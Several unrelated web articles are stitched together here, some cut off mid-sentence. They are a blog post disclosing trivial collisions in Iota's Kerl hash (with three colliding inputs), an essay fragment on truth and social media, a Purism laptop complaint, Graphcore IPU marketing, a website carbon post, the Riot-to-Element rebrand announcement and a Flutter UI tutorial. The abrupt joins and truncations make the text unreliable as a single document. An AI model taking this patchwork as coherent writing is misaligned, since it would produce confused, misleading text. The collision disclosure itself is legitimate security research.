<p>Iota replaced Curl-P-27 with a hash function based on Keccak-384 they call Kerl. Keccak, you may recall, is a sponge function that went on to become SHA-3.</p>



<p>At its face, this sounds like a conservative choice in cryptography protocol design: Migrate from a backdoored hash function to one trusted and respected by cryptographers around the world.</p>



<figure><div>

</div></figure>



<p>Iota even offered a bug bounty for attacks against reduced round variants:</p>



<figure><div>

</div><figcaption>I’ve never met a fiercer cryptography conference live-tweeter than @durumcrustulum.</figcaption></figure>



<p>Kerl isn’t Keccak-384 though. It’s Keccak-384 with a bit of an odd twist: They encode the input bytes into <strong>ternary</strong> ({0, 1} -&gt; {-1, 0, 1}) before hashing. Apparently this weird obsession with ternary encoding is part of Iota’s schtick?</p>



<h2 id="collisions">Practical Kerl Collisions</h2>



<p>As a consequence of their weird ternary obsession, the following inputs all produce the same Kerl hash:</p>



<ul><li>GYOMKVTSNHVJNCNFBBAH9AAMXLPLLLROQY99QN9DLSJUHDPBLCFFAIQXZA9BKMBJCYSFHFPXAHDWZFEIZ</li><li>GYOMKVTSNHVJNCNFBBAH9AAMXLPLLLROQY99QN9DLSJUHDPBLCFFAIQXZA9BKMBJCYSFHFPXAHDWZFEIH</li><li>GYOMKVTSNHVJNCNFBBAH9AAMXLPLLLROQY99QN9DLSJUHDPBLCFFAIQXZA9BKMBJCYSFHFPXAHDWZFEIQ</li></ul>



<p>This is a consequence of always zeroing out the last “trit” before passing the input to Keccak-384.</p>



<p>Since this zeroing was an explicit design choice of Iota’s, I decided to helpfully <a href="https://github.com/iotaledger/kerl/pull/8">submit a pull request</a> adding these inputs as test vectors to their JavaScript implementation.</p>



<h3 id="why-it-matters">Why It Matters</h3>



<p>These are the facts:</p>



<ul><li>Kerl is intended to replace Curl-P-27 within the Iota cryptocurrency.</li><li>The Iota Foundation previously admitted that Curl-P-27 was a “copy-protection backdoor”.</li><li>The ternary encoding in Kerl allows three different inputs to produce the same hash output (which is not true of Keccak-384).</li></ul>



<p>Given <a href="https://medium.com/iota-demystified/iota-vs-dci-or-how-an-innocent-hash-collision-became-a-huge-ego-collision-425114e61e8f">the past behavior of the Iota developers</a>, there are three possible explanations for this:</p>



<ol><li>It’s a <a href="https://aumasson.jp/data/talks/backdooring_syscan15.pdf">bugdoor</a> (a backdoor enabled by a bug) intended to be exploited by the Coordinator–possibly as another copy-protection backdoor in the spirit of Curl-P-27.</li><li>They made a critical design mistake in Kerl, which may or may not be exploitable in one or more of the places they use Kerl.</li><li>Their alleged justification for zeroing out the last trit is sound, and there’s no way to exploit this collision vulnerability within Iota.</li></ol>



<p>The last explanation is the one that Iota fanboys will probably cling to, but let me be clear: Even if this isn’t exploitable within Iota, it’s still a huge fuck-up in the design of Kerl.</p>



<p>I’ve lost count of the number of projects I’ve encountered that used secp256k1 as their elliptic curve choice simply because it was also the curve Bitcoin used. These are protocols doing ECDSA for JSON Web Tokens, or ECDH for use in <a href="https://crypto.stackexchange.com/questions/12823/ecdsa-vs-ecies-vs-ecdh">ECIES</a> schemes.</p>



<p>The probability of someone <em>eventually</em> using Kerl outside of Iota is 1, and they will be vulnerable to collisions because of that choice.</p>



<h2 id="takeaways">Takeaways</h2>



<p>Iota is a cryptocurrency project that threatens security researchers, intentionally backdoored the cryptographic hash function in their original design (for “copy-protection”) and admitted to it, and designed a replacement cryptographic hash function (Kerl) that is vulnerable to trivial collision attacks (but the underlying hash function, Keccak-384, is not).</p>



<p>I don’t need to connect the lines on this one, do I?</p>



<div><figure><img data-attachment-id="975" data-permalink="https://soatok.blog/riley-edit/" data-orig-file="https://soatok.files.wordpress.com/2020/07/riley-edit.png" data-orig-size="580,580" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="riley-edit" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/07/riley-edit.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/07/riley-edit.png?w=580" src="https://soatok.files.wordpress.com/2020/07/riley-edit.png?w=580" alt="" srcset="https://soatok.files.wordpress.com/2020/07/riley-edit.png 580w, https://soatok.files.wordpress.com/2020/07/riley-edit.png?w=150 150w, https://soatok.files.wordpress.com/2020/07/riley-edit.png?w=300 300w" sizes="(max-width: 580px) 100vw, 580px"><figcaption>It’s really freaking obvious.</figcaption></figure></div>



<p>Since this attack also works on “reduced round” variants of Kerl, I guess I win their bug bounty too!</p>



<p>If the Iota developers are reading this, please remit payment for your promised bounty to the following ZEC address: <strong>zs1lwghzjazt4h53gwnl7f24tdq99kw7eh9hgh3qumdvcndszl7ml4xmsudcmm60dut2cfesxmlcec</strong></p>



<p>That being said, I never got an answer to my question, “Should I report the security reduction in bits or trits?” I’m feeling generous though. Given the cost of a collision is basically 1 trit, this is a 242-trit security reduction against collision attacks in Kerl.</p>

Social media is weaponized, and while people spend more and more time online, they are being influenced by ideas turned into ideologies that may factually be wrong.</p><p id="viewer-bv41a"><a href="https://www.hilltimes.com/author/matt-mcmanus" target="_blank" rel="noopener">Matt McManus</a>, coined the term “<a href="https://www.hilltimes.com/2018/08/27/trump-age-bullshit-roots-knowledge-crisis/155316" target="_blank" rel="noopener">age of bullshit</a>” to express the knowledge crisis we are going through. It’s a dangerous time we live in, and in order to solve many of the challenges we face, we need, first, to focus on the meta-problems.</p><h2 id="viewer-83re0">A solution: the iterative model of truth</h2><h3 id="viewer-b8q47">The COVID19 Tracking Project</h3><p id="viewer-hnvv">As said, the press coverage of COVID-19 was disastrous early on. It led to most people and governments not taking the pandemic seriously. A counterexample of this is the <a href="https://covidtracking.com/" target="_blank" rel="noopener">COVID19 Tracking Project</a>.</p><p id="viewer-a7kdk">This tracking project was not presented as “the Truth” in the way the New York Times does. It shows the most accurate data, with revision history.</p><p id="viewer-544ku">Truth is a process; it’s not something set in stone; it changes. The problem with media corporations is that they present the truth as something fixed — the truth is what they publish. When they mistake, it’s difficult for them to admit that they have mistaken, because they would risk losing their positions as the guardians of the truth.</p><p id="viewer-dl914">It’s not a problem to be incorrect; the problem is not to admit it and build your whole legitimacy on being the truth.</p><h2 id="viewer-a80de">The GitHub Model of Truth</h2><p id="viewer-1vh0c">When’s the last time you heard a politician admitting he or she was wrong? I can’t think of an example. Conversely, if an app crashes, its developers will have no choice but to admit they made a mistake.</p><p id="viewer-fk3m8">It’s the GitHub model of truth. You know there will be mistakes, and you’re okay with it. As soon as you discover a problem, you correct it, and everyone can submit corrections.</p><p id="viewer-4ida7">Truth should follow the Github model. As soon as something is factually wrong, it should be easy to correct it and make the mistake visible to everyone.</p><p id="viewer-4l7ld">But how could we make it a reality outside of the tech world?</p><p id="viewer-e8tjf">For something to work, it must be created in a way that incentives are correctly aligned. Here, we want a collaborative system that gives us the best version of the truth.</p><h2 id="viewer-5otrr">How to Align the Incentives</h2><p id="viewer-a8302">The first idea that comes in mind to align the incentives is to make it financially attractive to be correct. What if “being right” meant earning money? An idea to fix this problem is to modify social media engagement metrics with social features based on a prediction market. Imagine if instead of liking or retweeting a tweet about an economically impactful statement, you could “bet” financially on it.</p><p id="viewer-46ogj">This approach would change the nature of the attention you give to the truth. You wouldn’t want to back the false claims, right? So before “betting” on a tweet, you would do your due diligence of fact-checking it and make sure it’s correct.</p><p id="viewer-c3726">No one should have the ability to say what’s right or wrong. It’s a collective process of multiple people fact-checking the statements and sourcing the information that can lead to the best version of the truth. The era of decentralized media must start if we want the truth.</p><p id="viewer-4djfj">In academia (I know a lot of things are wrong with academia), when a paper is published, it gets reviewed. We should do the same, but, unlike academia, we should do it in a decentralized way.</p><p id="viewer-b9dgk">For example, The <strong>Reproducibility Project: Psychology</strong> was a <a href="https://en.wikipedia.org/wiki/Crowdsourced_psychological_science" target="_blank" rel="noopener">crowdsourced</a> collaboration of 270 contributing authors to repeat 100 published experimental and correlational psychological studies. This idea of reproducing a finding must be transferred outside of the research world. What if independent reporters were doing the same with major stories?</p><p id="viewer-d2436">How would they get paid? The rise of independent journalism is happening now; Substack is an excellent example of it. An increasing amount of people are ready to subscribe to independent journalists to receive their work. It could be a solution to the problem. The <a href="https://taibbi.substack.com/" target="_blank" rel="noopener">newsletter</a> of Matt Taibbi is a great example of this, and another example is the excellent reporting of <a href="https://twitter.com/DellAnnaLuca" target="_blank" rel="noopener">Luca Dellanna</a> during the COVID-19 pandemic. To get the best information on the coronavirus, you had to follow the right people on Twitter, not the prominent publications.</p><p id="viewer-foc37">Decentralized and independent sources of information is also a way to promote <a href="https://marginalrevolution.com/marginalrevolution/2003/11/metarational_an.html" target="_blank" rel="noopener">meta-rationality</a>, a concept <a href="https://twitter.com/tylercowen" target="_blank" rel="noopener">Tyler Cowen</a> brings up a lot. It’s the concept of being aware of your cognitive limitations and know how to trust in topics where you don’t have the expertise to understand.</p><h2 id="viewer-4l0pi">New Social Media</h2><p id="viewer-5g9m7">Is it possible to have this approach to the truth using the existing social media? It seems hard. The social media were built with different motivations at the core. What we need is social media made entirely for the purpose of revealing the truth. As the French investor Xavier Faure <a href="https://twitter.com/XFaure/status/1092444972635303936" target="_blank" rel="noopener">said</a>:</p><blockquote id="viewer-ah70t"><p>“We need a trust social network.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">


          

            <p>This is just a quick note to mention that I have updated my <a href="https://anarc.at/hardware/laptop/purism-librem13v4">hardware
documentation on the Librem 13v4 laptop</a>. It has unfortunately
turned into a rather lengthy (and ranty) piece about Purism. Let's
just say that waiting weeks for your replacement laptop (yes, it died
again) does wonders for creativity. To quote the full review:</p>

<blockquote><p>TL;DR: I recommend people avoid the Purism brand and products. I
find they have questionable politics, operate in a "libre-washing"
fashion, and produce unreliable hardware. Will not buy again.</p></blockquote>

<p>People who have read the article might want to jump directly to the
new sections:</p>

<ul>
<li><a href="https://anarc.at/hardware/laptop/purism-librem13v4/#libre-washing">Libre washing</a></li>
<li><a href="https://anarc.at/hardware/laptop/purism-librem13v4/#bullshit-anti-interdiction">Bullshit anti-interdiction</a></li>
<li><a href="https://anarc.at/hardware/laptop/purism-librem13v4/#bullshit-crowdfunding">Bullshit crowdfunding</a></li>
<li><a href="https://anarc.at/hardware/laptop/purism-librem13v4/#hardware-reliability">Hardware reliability</a> (or lack thereof)</li>
</ul>


<p>I have also added the minor section of the <a href="https://anarc.at/hardware/laptop/purism-librem13v4/#no-mic-jack">missing mic jack</a>.</p>

<p>I realize that some folks (particularly at Debian) might still work at
Purism, and that this article might be demoralizing for their work. If
that is the case, I am sorry this article triggered you in any way and
I hope this can act as a disclaimer. But I feel it is my duty to
document the issues I am going through, as a user, and to call
bullshit when I see it (let's face it, the anti-interdiction stuff and
the Purism 5 crowd-funding campaign were total bullshit).</p>

<p>I also understand that the pandemic makes life hard for everyone, and
probably makes a bad situation at Purism worse. But those problems
existed before the pandemic happened. They were issues I had
identified in 2019 and that I simply never got around to document.</p>

<p>I wish that people wishing to support the free software movement would
spend their energy towards organisations that actually do honest work
in that direction, like <a href="https://system76.com/">System76</a> and <a href="https://www.pine64.org/">Pine64</a>. And if you're
going to go crazy with an experimental free hardware design, why not
go retro with the <a href="https://www.crowdsupply.com/mnt/reform">MNT Reform</a>.</p>

<p>In the meantime, if you're looking for a phone, I recommend you give
the <a href="https://www.fairphone.com/">Fairphone</a> a fair chance. It really is a "fair" (as in, not
the best, but okay) phone that you can moderately liberate, and it
actually frigging works. See also my <a href="https://anarc.at/hardware/phone/fairphone2">hardware review of the FP2</a>.</p>

<p>Update: this kind of blew up, for my standards: 10k visitors in ~24h
while I usually get about 1k visitors after a week on any regular blog
post. There were more discussions on the subject here:</p>

<p>Trigger warning: some of those threads include personal insults and
explicitly venture into the <a href="https://anarc.at/blog/2019-05-13-free-speech/">free speech
discussion</a>, with predictable (sad)
consequences...</p>

<p><span data-contrast="auto" xml:lang="EN-GB" lang="EN-GB"><span>At the heart of every IPU-Machine M2000 is our new<span>&nbsp;</span></span><span>Graphcore</span><span><span>&nbsp;</span>Colossus™ Mk2 GC200 IPU. Developed using TSMC’s latest 7nm process technology, each chip contains more than 59.4 billion transistors on a single 823sqmm die, making it the most complex processor ever made.</span></span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>

<p><span data-contrast="auto">GC200 integrates 1,472 separate IPU-Cores, and&nbsp;is capable of executing&nbsp;8,832 separate parallel computing threads. Each IPU processor core gets a performance boost from a set of novel floating-point technologies developed by&nbsp;Graphcore, called&nbsp;</span><strong><span data-contrast="auto">AI-Float.&nbsp;</span></strong><span data-contrast="auto">By tuning arithmetic implementations for energy and performance in Machine Intelligence computation, we&nbsp;are able to&nbsp;serve up one&nbsp;PetaFlop&nbsp;of AI compute in each IPU-Machine M2000 1U blade.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">With class leading support for FP32 IEEE floating point arithmetic we also support FP16.32 (16bit multiply with 32bit accumulate) and FP16.16 (16bit multiply accumulate). However, our Colossus IPUs are unique in having support for Stochastic Rounding on the arithmetic that is supported in hardware and runs at the full speed of the processor. This allows the Colossus Mk2 IPU to keep all arithmetic in 16bit formats, reducing memory requirements, saving on read and write energy and reducing energy in the arithmetic logic, while delivering full accuracy Machine Intelligence results. Each of the 1,472 processor cores and each of the 8,832 parallel program threads can generate a separate random number seed with shaped noise, allowing a unique compute capability to support, for example, Probabilistic or Evolution Strategy models. </span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">The AI-Float arithmetic block also provides native support for sparse arithmetic floating-point operations. We provide library support for different sparse operations including block sparsity and dynamic sparsity. This means that the IPU delivers much more efficient compute on sparse data, not just in inference, but also during training, helping innovators to create new types of complex models that deliver state of the art performance with much fewer parameters, faster training times and using much less energy.&nbsp;</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><strong>Data</strong></p>
<p><span data-contrast="auto">Our IPUs working together with Poplar, also have a radical new approach to memory organisation. Firstly, each IPU has a huge amount of In-Processor Memory™ with our new Mk2 GC200 having an unprecedented 900MB ultra-high-speed SRAM inside the processor. This is spread across the IPU, with In-Processor Memory sitting right next to each processor core in an IPU-Tile™ for the lowest energy access per bit. 900 MB is a 3x step up in density when compared to our Mk1 IPU and is enough to hold massive models, prior state, or many layers of even the world’s largest models inside the chip running at the full speed of the processor. </span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">Our Poplar software also allows IPUs to access Streaming Memory™&nbsp; through&nbsp;our unique&nbsp;</span><strong><span data-contrast="auto">Exchange-Memory™</span></strong><span data-contrast="auto"> communication. This allows large models with 100’s Billions of parameters to be supported. Each IPU-Machine M2000 can support Exchange-Memory™ with up to 450GB in density and with an unprecedented bandwidth of 180TBytes/sec. As a result, the IPU Exchange-Memory delivers over a 10x advantage in density together with over a 100x advantage in memory bandwidth when compared to the very latest 7nm GPU products. </span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">Overall, the combination of the unique way that the IPU accesses memory, the class-leading In-Processor Memory design and Exchange Memory features, together with native support for sparsity, enable developers to execute machine learning models at very high speed, no matter how large or how complex. </span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><strong>Communication</strong></p>
<p><span data-contrast="auto" xml:lang="EN-GB" lang="EN-GB"><span>Unlike other solutions, you don’t need to add expensive InfiniBand networking cards to connect the IPU-Machines; each IPU-M2000 has dedicated AI networking built in.

<p><span data-contrast="auto">We created a new Graphcore GC4000 IPU-Gateway chip that delivers incredibly low latency and high bandwidth, for each IPU-Machine M2000 delivering 2.8 Tbps bandwidth. As you connect more IPU-Machine M2000 systems together, the overall bandwidth grows to many Petabits/sec.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">And while IPU-Fabric has been built from the ground-up to maximise performance in IPU-based systems, it is also designed for maximum compatibility with existing datacenter infrastructure.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">IPU-Fabric uses standard copper or optical OSFP connectors, linking IPUs up and down the rack. In larger configurations, communication between IPU-PODs uses tunneling-over-Ethernet technology to maintain throughput, while allowing the use of standard QSFP interconnect and 100Gb Ethernet switches – underscoring Graphcore’s commitment to straightforward deployment in mixed-use datacenters.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">Across the entire system, IPU-Fabric uses a 3D ring topology, chosen both for maximum efficiency and because it maps well to the three dimensions of parallelism found in Machine Intelligence compute.</span></p>

<p><span data-contrast="auto">IPU-Fabric is fully supported by our Poplar SDK.

  <div itemprop="articleBody">
    <p>For a while I’ve been intending to make my website more sustainable, but I succumbed, as I often do, to the human trait of sloth. But this morning after reading <a href="https://alistapart.com/article/webwaste/">Gerry McGovern’s post on webwaste</a>, I thought I’d procrastinated long enough.</p>

<p>So I ran a web page performance test and got some <a href="https://www.webpagetest.org/result/200713_XX_e2daed33a24cd8a099d930fc373b1083/">grim results</a>: my website takes over a minute to load on a Moto G4 on using 3G data networks. It’s just as bad <a href="https://www.webpagetest.org/result/200713_6E_4e249b485a45882604420068caa21ae0/">using a desktop PC in Nottingham on 1.5Mbps DSL</a>. My website is bloated with large images and a bunch of JavaScript, which means it’s eating up lots of energy transmitting those bits and bytes.</p>

<p>But how much energy? I used the <a href="https://www.websitecarbon.com/">Website Carbon Calculator</a> to find out. Turns out that</p>

<ul>
  <li>6.90g of CO2 is produced every time someone visits the homepage</li>
  <li>it emits the amount of carbon that 4 trees absorb in a year, and</li>
  <li>it uses enough electricity to drive an electric car 1,116km</li>
</ul>

<p>Eugh. That’s disgusting. For each year my website has been online, I should have planted 4 trees just for the homepage alone. But, instead, my laziness has filled the atmosphere with more and more carbon.</p>

<p>I have to do something, this has gone on long enough, so I’m committing to some actions.</p>

<ol>
  <li>I’ll move my site to a web hosting provider using renewable energy, one that’s listed on the <a href="https://www.thegreenwebfoundation.org/directory/">Green Web Foundation’s directory</a>. <strong>DONE</strong></li>
  <li>I’ll compress and optimise the images on my site using <a href="https://imageoptim.com/mac">ImageOptim</a>. <strong>DONE</strong></li>
  <li>I’ll get rid of <a href="https://github.com/samesies/barber-jekyll">my energy-guzzling site theme</a> until I can introduce one that’s lightweight and accessible. <strong>DONE</strong></li>
  <li>Going forward, my website will enshrine the principles of the <a href="https://www.sustainablewebmanifesto.com/">Sustainable Web Manifesto</a>. <strong>SIGNED</strong></li>
  <li><strong>NEW</strong>: I’ll pay for some trees to be planted that’ll reduce the impact of my website’s carbon footprint going forward.</li>
</ol>

<p>To show my committment to being a good web citizen, I’ll add the <a href="https://www.websitecarbon.com/badge/">Website Carbon Badge</a> to all pages (<strong>DONE</strong>) and the <a href="https://www.thegreenwebfoundation.org/green-web-check/">Green Web Foundation’s renewable hosting badge</a> (<strong>DONE</strong>). Once I’ve improved things, I’ll add a <a href="https://carbontxt.org/">carbon.txt</a> (<strong>DONE</strong>).</p>

<p>One day I’ll actually get around to building a solar-powered battery bank and run my site off my home connection, but until then I’m taking small steps to remove, minimise and clean-up my presence on the web.</p>

<p>What’s the carbon footprint of your website? What steps will you take to reduce it?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Hi everyone,</p><p>We are incredibly excited to announce that <strong>Riot is now Element</strong>! </p><p>In fact we have simplified all our naming: Element is also the name for New Vector (the company behind Riot) while Modular, our flagship Matrix hosting service, has become Element Matrix Services.</p><p>For those discovering us for the first time: Element is the flagship secure collaboration app for the decentralised <a href="https://matrix.org/">Matrix</a> communication network. &nbsp;Element lets you own your own end-to-end encrypted chat server, while still connecting to everyone else in the wider Matrix network.</p><figure><img src="https://element.io/blog/content/images/2020/07/element-logo.png"></figure><p><br>What’s more, <strong>RiotX is now out of beta</strong> - our next generation Matrix client for Android has flown the nest and spread its wings as Element - replacing the old Riot Android app at last!</p><p>This name change has been a long time in the making. As we explained when we announced the rebrand <a href="https://blog.riot.im/the-world-is-changing/">a few weeks ago</a>, we’ve had major issues with a certain gigantic games company which has blocked us from being able to trademark Riot or even Riot.im - a huge issue when it comes to defending users against abusive forks of the app. Secondly, people incorrectly assume Riot refers to violence, rather than the more constructive forms of chaos we had in mind. Lastly, it made sense in the early days of Matrix to have different brands to illustrate the different roles of Riot, Modular and New Vector in the ecosystem… but nowadays there are loads of Matrix clients, Matrix hosting providers and companies building on Matrix - and so all New Vector’s different names were just causing confusion. &nbsp;</p><h3 id="so-why-element">So, why Element?</h3><p>We want a name that reflects the emphasis on simplicity and clarity that we aimed for when designing RiotX; a name that highlights our single-minded mission to make Element the most elegant and usable mainstream comms app imaginable. &nbsp;Riot had a pretty chequered history, spending much of its life in beta, with intermittent attention to design until we hit 1.0 last year - but nowadays we have a dedicated full-time design team working on Element, who not only design the graphics but the overall behaviour of new features in the app. &nbsp;This is not an easy task, given it turns out the hardest bits of end-to-end encryption are almost entirely UX challenges. &nbsp;What’s more, presenting a global decentralised communication network as simply as a centralised communication island is surprisingly tricky. &nbsp;However: we have been making massive progress, to the extent that we are barely recognisable as the Riot of the past. Element reflects a clean start to focus monomaniacally on mainstream usability in future.</p><p>We also want a name that better evokes the idea of data ownership and self-sovereignty. &nbsp;An element is the smallest indivisible thing in a system - yet one which can stand alone. &nbsp;You can customise it, control it and make it your own - you can literally be in your Element!</p><p>Moreover, we want a name that will be future-proof for peer-to-peer Matrix. &nbsp;As Matrix.org announced last month, <a href="https://matrix.org/blog/2020/06/02/introducing-p-2-p-matrix">P2P Matrix is in heavy development</a> - and we can see a world where Element will literally be an element of Matrix, running your own homeserver within the app, so you can communicate if you don’t have a server… or even Internet.

July 14, 2020 | https://www.nomtek.com/blog/sleek-ui-in-flutter-wolt | <a href="https://web.archive.org/web/*/https://www.nomtek.com/blog/sleek-ui-in-flutter-wolt">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Flutter is Google’s UI toolkit for building beautiful, natively compiled applications for mobile, web, and desktop from a single codebase</em>. We are going to check its promises by recreating part of an existing application as accurately as possible. I chose the Wolt app because the Wolt team has been doing an amazing job, creating sleek UI &amp; UX with many subtle details.</p><figure id="w-node-ef7dc46c635c-c5de3bde"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/UI9vN8Y583o"></iframe></p></figure><p>‍<br></p><p>My goal for this series is to present a thought process that leads to the desired result rather than provide a copy-paste solution. We will work in a build-refactor cycle, examining potential problems and framework limitations. You may find the whole code for this series on our github: <a href="https://github.com/nomtek/flutter-meets-wolt">https://github.com/nomtek/flutter-meets-wolt</a>.<br>Let’s dive in!<br></p><h2>App bar buttons &amp; menu</h2><p>Let’s warm up with something that seems to be simple - app bar buttons. There are two of them - one is used to navigate back, and the other is showing a menu with two items. My first idea was to use <em>IconButton</em> composed with <em>Container</em> that has circle-shaped decoration:</p><div>
<pre>class AppBarButton extends StatelessWidget {
  final IconData icon;
  final VoidCallback onPressed;
     
     const AppBarButton({Key key, this.icon, this.onPressed}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(shape: BoxShape.circle, color: Colors.grey[300]),
      child: IconButton(
        icon: Icon(icon),
        onPressed: onPressed,
      ),
    );
  }
}
     </pre>
</div><p>When we put those widgets in an AppBar:</p><div>
<pre>SliverAppBar(
  leading: AppBarButton(
    icon: Icons.keyboard_backspace,
    onPressed: () =&gt; Navigator.pop(context),
  ),
  actions: [
    AppBarButton(
      icon: Icons.more_horiz,
      onPressed: () { /* TODO */ },
    ),
  ],
  </pre>
  </div><p>The result is already quite similar to what we have in the original application:<br></p><figure><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eeca98badfe870ce2c0e65a_Hnet.com-image.gif" alt=""></p></figure><p>Our first implementation has no padding and buttons are too big. When we press the button it shows a grey highlight followed by an animated, darker splash instead of opacity change. Let’s try to implement those missing features.</p><h2>Size and layout</h2><p>On the iPhone 8, original buttons have a size of 40x40 points, 16 points margin to the screen edge and 8 points bottom offset. Given that app bar has a height of 44 points on this iPhone it would mean that those buttons have to overlay status bar (the one with signal strength, clock and battery status) and indeed they are:<br></p><figure id="w-node-53719c61cb64-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eeca9d84b65ff38701fee0a_overlay.png" alt="flutter_overlay"></p></figure><p>We can apply those constraints by wrapping our button widgets in <em>Padding</em> and <em>Align</em>.</p><div>
<pre>    return Padding(
      padding: EdgeInsets.fromLTRB(
        position == AppBarPosition.leading ? 16 : 0, 0,
        position == AppBarPosition.trailing ? 16 : 0, 8),
      child: Align(
        alignment: Alignment.topCenter,
        child: Container(
          width: 40,
          height: 40,
(...)

  </pre>
  </div><figure id="w-node-11a065b0312c-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eecaa077f68da65b8562c7c_56px_app_bar.png" alt="flutter_app_bar"></p></figure><p>One difference is that the bottom offset is bigger in our implementation and we don’t even overflow status bar. The reason is that the height of our app bar is calculated based on the <em>const double kToolbarHeight = 56.0; </em>constant from the Flutter framework. There is no explicit way to set app bar height, eg. by constructor parameter, and the class responsible for the app bar layout, which uses this constant, is private (<em>_SliverAppBarDelegate</em>). This prevents us from using inheritance to override the code responsible for height computation. This delegate is, again, not exposed by the app bar (<em>SliverAppBar</em>), so even if we end up creating our own version, we won’t be able to use it unless we also extend <em>SliverAppBar</em> and override<em> build</em> method from its state. Since Flutter is open source this could be done in a few minutes, by copy-paste original implementation and tweaking those details, but it’s far from feasible solution as we would have to maintain our version and keep it in sync with improvements made by the Flutter team to the original classes.<br></p><p>It’s worth to take a note, that<em> kToolbarHeight</em> is also used to constraint the width of the leading widget (back button in our case), forcing it to be a square. This is how our app bar looks like with margins increased to 25 points. Notice shrunken leading button, while trailing is spaced from the screen edge as expected. This limitation has no effect in our case, as designed margin and button size is exactly matching available space.<br></p><figure id="w-node-0b501ed6363f-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eecaa3d49a49185d4d77cdd_25px_margin.png" alt="flutter_margin"></p></figure><h2>Highlight behaviour<br></h2><p>In the Wolt app when the button is highlighted it changes the opacity of the icon. There is no highlight colour change or splash animation. We can re-create such behaviour by wrapping button in the <em>Opacity</em> widget. To track highlight status we have to introduce an internal state, represented by the <em>_isHighlighted</em> boolean property. That means we have to refactor our widget from stateless to stateful:</p><div>
<pre>enum AppBarPosition {
  leading,
  trailing,
}

class AppBarButton extends StatefulWidget {
  final IconData icon;
  final VoidCallback onPressed;
  final AppBarPosition position;

  const AppBarButton({Key key, this.icon, this.onPressed, this.position}) : super(key: key);

  @override
  _AppBarButtonState createState() =&gt; _AppBarButtonState();
}

class _AppBarButtonState extends State<appbarbutton> {

  bool _isHighlighted = false;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: EdgeInsets.fromLTRB(widget.position == AppBarPosition.leading ? 16 : 0, 0,
          widget.position == AppBarPosition.trailing ? 16 : 0, 8),
      child: Align(
        alignment: Alignment.topCenter,
        child: Container(
          width: 40,
          height: 40,
          decoration: BoxDecoration(shape: BoxShape.circle, color: Colors.grey[300]),
          child: Opacity(
            opacity: _isHighlighted ? 0.3 : 1.0,
            child: IconButton(
              icon: Icon(
                widget.icon,
                color: Colors.black,
              ),
              onPressed: widget.onPressed,
            ),
          ),
        ),
      ),
    );
  }
}
  </appbarbutton></pre>
  </div><p>Unfortunately, <em>IconButton</em> we are using is not exposing <em>onHighlightChanged</em> callback - only <em>onPressed</em>, which is not enough for our needs. We have to refactor our code to use more generic button class, like<em> RawMaterialButton</em> where we have more control over callbacks and visual settings.</p><div>
<pre>  child: RawMaterialButton(
    highlightColor: Colors.transparent,
    splashColor: Colors.transparent,
    onHighlightChanged: (isHighlighted) =&gt; setState(() {
      _isHighlighted = isHighlighted;
    }),
    child: Icon(
      widget.icon,
      color: Colors.black,
    ),
    onPressed: widget.onPressed,
  ),
</pre>
</div><h2>Showing the menu<br></h2><p>When the user presses menu button two things happen - the menu is shown and the button icon changes from three dots to close cross. We are going to track the current state in the boolean property <em>_isMenuShown </em>in the State of the screen-route. Updated menu button:</p><div>
<pre>    AppBarButton(
      icon: _isMenuShown ? Icons.close : Icons.more_horiz,
      position: AppBarPosition.trailing,
      onPressed: () {
        Navigator.push(context, AppBarMenu())
            .then((_) =&gt; setState(() =&gt; _isMenuShown = false));
        setState(() =&gt; _isMenuShown = true);
      },
    ),
</pre>
